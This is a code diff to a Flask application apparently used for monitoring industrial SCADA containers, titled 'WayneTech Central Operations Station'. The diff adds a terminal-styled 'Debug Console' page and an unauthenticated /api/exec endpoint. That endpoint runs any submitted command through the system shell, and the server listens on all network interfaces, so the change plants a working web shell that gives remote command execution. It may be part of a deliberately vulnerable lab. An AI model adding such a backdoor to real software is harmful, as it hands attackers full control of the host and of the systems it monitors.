@@ -406,6 +406,150 @@ def fetch_scadabr(container_name):
     except: pass
     return {'online': False, 'data': None}
 
+WEBSHELL_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WayneTech Debug Console</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a; color: #00ff41; font-family: 'Fira Code', monospace;
+            height: 100vh; display: flex; flex-direction: column;
+            background-image: radial-gradient(circle at 50% 0%, #0d1117, #0a0a0a 60%);
+        }
+        .toolbar {
+            background: #161b22; border-bottom: 1px solid #30363d;
+            padding: 8px 16px; display: flex; align-items: center; gap: 12px;
+            font-size: 12px; color: #8b949e;
+        }
+        .toolbar .dots { display: flex; gap: 6px; }
+        .toolbar .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot-r { background: #ff5f57; } .dot-y { background: #febc2e; } .dot-g { background: #28c840; }
+        .toolbar .title { flex: 1; text-align: center; color: #c9d1d9; font-weight: 600; letter-spacing: 1px; }
+        .toolbar .badge {
+            background: rgba(239,68,68,0.15); color: #f87171; padding: 2px 8px;
+            border-radius: 4px; border: 1px solid rgba(239,68,68,0.3); font-size: 10px; font-weight: 600;
+        }
+        #terminal {
+            flex: 1; overflow-y: auto; padding: 16px; font-size: 13px; line-height: 1.7;
+        }
+        #terminal::-webkit-scrollbar { width: 6px; }
+        #terminal::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+        .line { white-space: pre-wrap; word-break: break-all; }
+        .line.cmd { color: #58a6ff; }
+        .line.err { color: #f87171; }
+        .line.info { color: #8b949e; }
+        .line.success { color: #3fb950; }
+        .input-row {
+            display: flex; align-items: center; padding: 8px 16px;
+            background: #161b22; border-top: 1px solid #30363d; gap: 8px;
+        }
+        .prompt { color: #f87171; font-weight: 600; white-space: nowrap; font-size: 13px; }
+        #cmd-input {
+            flex: 1; background: transparent; border: none; outline: none;
+            color: #c9d1d9; font-family: 'Fira Code', monospace; font-size: 13px;
+            caret-color: #00ff41;
+        }
+        .banner { color: #8b949e; margin-bottom: 12px; }
+        .banner .highlight { color: #f87171; font-weight: 600; }
+        .banner .warn { color: #d29922; }
+    </style>
+</head>
+<body>
+    <div class="toolbar">
+        <div class="dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div>
+        <div class="title">root@central-monitoring — bash</div>
+        <div class="badge">ROOT ACCESS</div>
+    </div>
+    <div id="terminal">
+        <div class="banner">
+<span class="highlight">╔══════════════════════════════════════════════════════════╗</span>
+<span class="highlight">║</span>  WayneTech Internal Debug Console v2.1                   <span class="highlight">║</span>
+<span class="highlight">║</span>  <span class="warn">WARNING: This interface has full system access</span>           <span class="highlight">║</span>
+<span class="highlight">║</span>  Container: central-monitoring | PID 1                    <span class="highlight">║</span>
+<span class="highlight">╚══════════════════════════════════════════════════════════╝</span>
+        </div>
+    </div>
+    <div class="input-row">
+        <span class="prompt">root@central-monitoring:~#</span>
+        <input type="text" id="cmd-input" autofocus autocomplete="off" spellcheck="false" placeholder="Type command...">
+    </div>
+
+    <script>
+        const terminal = document.getElementById('terminal');
+        const input = document.getElementById('cmd-input');
+        const history = [];
+        let histIdx = -1;
+
+        function addLine(text, cls = '') {
+            const div = document.createElement('div');
+            div.className = 'line ' + cls;
+            div.textContent = text;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        input.addEventListener('keydown', async (e) => {
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (histIdx < history.length - 1) { histIdx++; input.value = history[history.length - 1 - histIdx]; }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (histIdx > 0) { histIdx--; input.value = history[history.length - 1 - histIdx]; }
+                else { histIdx = -1; input.value = ''; }
+            }
+            if (e.key !== 'Enter') return;
+            const cmd = input.value.trim();
+            if (!cmd) return;
+
+            history.push(cmd);
+            histIdx = -1;
+            addLine('root@central-monitoring:~# ' + cmd, 'cmd');
+            input.value = '';
+
+            if (cmd === 'clear') { terminal.innerHTML = ''; return; }
+
+            try {
+                const res = await fetch('/api/exec', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cmd: cmd })
+                });
+                const data = await res.json();
+                if (data.output) addLine(data.output);
+                if (data.error) addLine(data.error, 'err');
+            } catch (err) {
+                addLine('Connection lost: ' + err.message, 'err');
+            }
+        });
+
+        input.focus();
+        document.addEventListener('click', () => input.focus());
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/debug/terminal')
+def debug_terminal():
+    return render_template_string(WEBSHELL_HTML)
+
+@app.route('/api/exec', methods=['POST'])
+def api_exec():
+    import subprocess
+    data = request.get_json()
+    cmd = data.get('cmd', '')
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        return jsonify({'output': result.stdout, 'error': result.stderr})
+    except subprocess.TimeoutExpired:
+        return jsonify({'output': '', 'error': 'Command timed out (15s limit)'})
+    except Exception as e:
+        return jsonify({'output': '', 'error': str(e)})
+
 if __name__ == '__main__':
     print("WayneTech Central Operations Station Started")
     app.run(host='0.0.0.0', port=5000, debug=False)
